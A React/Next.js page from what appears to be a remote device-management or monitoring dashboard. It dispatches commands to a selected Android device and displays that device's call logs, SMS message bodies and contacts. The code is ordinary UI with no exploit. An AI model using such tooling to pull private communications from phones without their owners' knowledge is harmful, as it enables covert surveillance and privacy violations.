"use client";

import { AppSidebar } from "@/components/app-sidebar";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Phone, MessageSquare, Users, RefreshCw } from "lucide-react";
import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { useGateway } from "@/hooks/use-gateway";
import Select from "react-select";

type Tab = "calls" | "sms" | "contacts";

interface CallEntry {
  _id: string;
  number: string;
  name?: string;
  type: number;
  duration: number;
  timestamp: string;
}
interface SmsEntry {
  _id: string;
  address: string;
  body: string;
  type: number;
  timestamp: string;
}
interface ContactEntry {
  _id: string;
  name: string;
  phone: string;
}

export default function PhonePage() {
  const searchParams = useSearchParams();
  const { devices, dispatch, subscribe, resolveTarget, ensureConnected } = useGateway();
  const [selectedDevice, setSelectedDevice] = useState(searchParams.get("device") || "");
  const [activeTab, setActiveTab] = useState<Tab>("calls");
  const [loading, setLoading] = useState(false);
  const [callLogs, setCallLogs] = useState<CallEntry[]>([]);
  const [smsMessages, setSmsMessages] = useState<SmsEntry[]>([]);
  const [contacts, setContacts] = useState<ContactEntry[]>([]);
  const [searchQuery, setSearchQuery] = useState("");

  useEffect(() => {
    ensureConnected();
    if (!selectedDevice) {
      const next = resolveTarget() || devices[0]?.value || "";
      if (next) setSelectedDevice(next);
    }
  }, [devices, ensureConnected, resolveTarget, selectedDevice]);

  useEffect(() => {
    return subscribe((event) => {
      if (event.type !== "json" || !event.packet) return;
      const msg = event.packet as Record<string, unknown>;
      if (msg.type !== "history_telemetry") return;
      const entries = Array.isArray(msg.entries) ? msg.entries : [];
      if (msg.command === "FETCH_CALL_LOGS" && entries.length) setCallLogs(entries as CallEntry[]);
      if (msg.command === "FETCH_SMS_MESSAGES" && entries.length) setSmsMessages(entries as SmsEntry[]);
      if (msg.command === "FETCH_CONTACTS" && entries.length) setContacts(entries as ContactEntry[]);
      setLoading(false);
    });
  }, [subscribe]);

  useEffect(() => {
    if (!selectedDevice) return;
    let cancelled = false;
    setLoading(true);
    (async () => {
      try {
        const limit = 500;
        if (activeTab === "calls") {
          const res = await fetch(`/api/logs/call-logs?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
            credentials: "include",
            cache: "no-store",
          });
          const data = await res.json();
          if (!cancelled && data.success) setCallLogs(data.logs || []);
        } else if (activeTab === "sms") {
          const res = await fetch(`/api/logs/sms?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
            credentials: "include",
            cache: "no-store",
          });
          const data = await res.json();
          if (!cancelled && data.success) setSmsMessages(data.messages || []);
        } else {
          const res = await fetch(`/api/logs/contacts?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
            credentials: "include",
            cache: "no-store",
          });
          const data = await res.json();
          if (!cancelled && data.success) setContacts(data.contacts || []);
        }
      } catch {
        /* ignore */
      } finally {
        if (!cancelled) setLoading(false);
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [activeTab, selectedDevice]);

  const refreshLive = () => {
    if (!selectedDevice) return;
    setLoading(true);
    if (activeTab === "calls") dispatch("FETCH_CALL_LOGS", {}, selectedDevice);
    else if (activeTab === "sms") dispatch("FETCH_SMS_MESSAGES", {}, selectedDevice);
    else dispatch("FETCH_CONTACTS", {}, selectedDevice);
  };

  const q = searchQuery.trim().toLowerCase();
  const filteredCalls = callLogs.filter(
    (c) => !q || c.number?.toLowerCase().includes(q) || c.name?.toLowerCase().includes(q)
  );
  const filteredSms = smsMessages.filter(
    (s) => !q || s.address?.toLowerCase().includes(q) || s.body?.toLowerCase().includes(q)
  );
  const filteredContacts = contacts.filter(
    (c) => !q || c.name?.toLowerCase().includes(q) || c.phone?.toLowerCase().includes(q)
  );

  const formatTime = (v: string) => {
    try {
      return new Date(v).toLocaleString();
    } catch {
      return v;
    }
  };

  const deviceOptions = devices.map((d) => ({ value: d.value, label: d.label || d.value }));

  return (
    <div className="flex h-screen bg-background">
      <AppSidebar />
      <main className="flex-1 sidebar-aware-main overflow-auto p-6">
        <div className="max-w-5xl mx-auto">
          <div className="flex flex-wrap items-center justify-between gap-3 mb-6">
            <div>
              <h1 className="text-2xl font-display tracking-tight">Phone</h1>
              <p className="text-sm text-muted-foreground">Calls, messages & contacts (Android)</p>
            </div>
            <div className="flex items-center gap-2">
              <div className="w-56">
                <Select
                  options={deviceOptions}
                  value={deviceOptions.find((o) => o.value === selectedDevice) || null}
                  onChange={(opt: { value: string } | null) => setSelectedDevice(opt?.value || "")}
                  placeholder="Select device"
                  classNamePrefix="react-select"
                />
              </div>
              <Button variant="outline" size="sm" onClick={refreshLive} disabled={!selectedDevice || loading}>
                <RefreshCw className={`w-4 h-4 mr-1 ${loading ? "animate-spin" : ""}`} />
                Refresh
              </Button>
            </div>
          </div>

          <div className="flex gap-2 border-b border-border mb-4">
            {(
              [
                { id: "calls" as const, label: "Calls", icon: Phone },
                { id: "sms" as const, label: "Messages", icon: MessageSquare },
                { id: "contacts" as const, label: "Contacts", icon: Users },
              ] as const
            ).map((tab) => (
              <button
                key={tab.id}
                type="button"
                onClick={() => setActiveTab(tab.id)}
                className={`px-4 py-2 text-sm border-b-2 flex items-center gap-2 ${
                  activeTab === tab.id
                    ? "border-foreground text-foreground"
                    : "border-transparent text-muted-foreground"
                }`}
              >
                <tab.icon className="w-4 h-4" />
                {tab.label}
              </button>
            ))}
          </div>

          <input
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            placeholder="Search number, name, message…"
            className="mb-4 w-full max-w-md rounded-lg border border-border bg-background px-3 py-2 text-sm"
          />

          <div className="space-y-3">
            {activeTab === "calls" &&
              (filteredCalls.length === 0 ? (
                <Card className="p-8 text-center text-muted-foreground">No call logs</Card>
              ) : (
                filteredCalls.map((entry, idx) => (
                  <Card key={entry._id || idx} className="p-4">
                    <div className="flex gap-3">
                      <Phone className="w-5 h-5 mt-0.5 text-muted-foreground" />
                      <div>
                        <p className="font-medium">{entry.name || entry.number}</p>
                        <p className="text-sm text-muted-foreground">
                          {entry.number} · type {entry.type} · {entry.duration}s
                        </p>
                        <p className="text-xs text-muted-foreground mt-1">{formatTime(entry.timestamp)}</p>
                      </div>
                    </div>
                  </Card>
                ))
              ))}

            {activeTab === "sms" &&
              (filteredSms.length === 0 ? (
                <Card className="p-8 text-center text-muted-foreground">No messages</Card>
              ) : (
                filteredSms.map((entry, idx) => (
                  <Card key={entry._id || idx} className="p-4">
                    <div className="flex gap-3">
                      <MessageSquare className="w-5 h-5 mt-0.5 text-muted-foreground" />
                      <div>
                        <p className="font-medium">{entry.address}</p>
                        <p className="text-sm text-muted-foreground mt-1">{entry.body}</p>
                        <p className="text-xs text-muted-foreground mt-1">{formatTime(entry.timestamp)}</p>
                      </div>
                    </div>
                  </Card>
                ))
              ))}

            {activeTab === "contacts" &&
              (filteredContacts.length === 0 ? (
                <Card className="p-8 text-center text-muted-foreground">No contacts</Card>
              ) : (
                filteredContacts.map((entry, idx) => (
                  <Card key={entry._id || idx} className="p-4">
                    <div className="flex gap-3">
                      <Users className="w-5 h-5 mt-0.5 text-muted-foreground" />
                      <div>
                        <p className="font-medium">{entry.name || "Unknown"}</p>
                        <p className="text-sm text-muted-foreground">{entry.phone}</p>
                      </div>
                    </div>
                  </Card>
                ))
              ))}
          </div>
        </div>
      </main>
    </div>
  );
}
